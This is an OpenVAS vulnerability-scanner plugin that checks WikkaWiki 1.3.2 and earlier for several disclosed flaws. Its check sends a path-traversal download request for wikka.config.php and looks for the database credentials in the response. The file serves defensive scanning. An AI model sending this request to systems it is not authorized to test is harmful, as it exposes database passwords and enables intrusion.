###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wikka_50866.nasl 12018 2018-10-22 13:31:29Z mmartin $
#
# WikkaWiki Multiple Security Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103350");
  script_bugtraq_id(50866);
  script_cve_id("CVE-2011-4448", "CVE-2011-4449", "CVE-2011-4450", "CVE-2011-4451");
  script_version("$Revision: 12018 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("WikkaWiki Multiple Security Vulnerabilities");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50866");
  script_xref(name:"URL", value:"http://wikkawiki.org/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/520687");
  script_tag(name:"last_modification", value:"$Date: 2018-10-22 15:31:29 +0200 (Mon, 22 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-12-01 11:51:48 +0100 (Thu, 01 Dec 2011)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"summary", value:"WikkaWiki is prone to multiple security vulnerabilities, including:

  - An SQL injection vulnerability.

  - An arbitrary file upload vulnerability.

  - An arbitrary file deletion vulnerability.

  - An arbitrary file download vulnerability.

  - A PHP code injection vulnerability.

Attackers can exploit these issues to modify the logic of SQL queries.
Upload, delete, or download arbitrary files, or inject and execute
arbitrary PHP code in the context of the affected application. Other
attacks may also be possible.

WikkaWiki 1.3.2 and prior versions are vulnerable.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);

}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

foreach dir( make_list_unique( "/wikka", "/wikki", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = string(dir, "/test/files.xml?action=download&file=/../../wikka.config.php");

  if( http_vuln_check( port:port, url:url, pattern:"mysql_host", extra_check:make_list( "mysql_database", "mysql_user", "mysql_password" ) ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
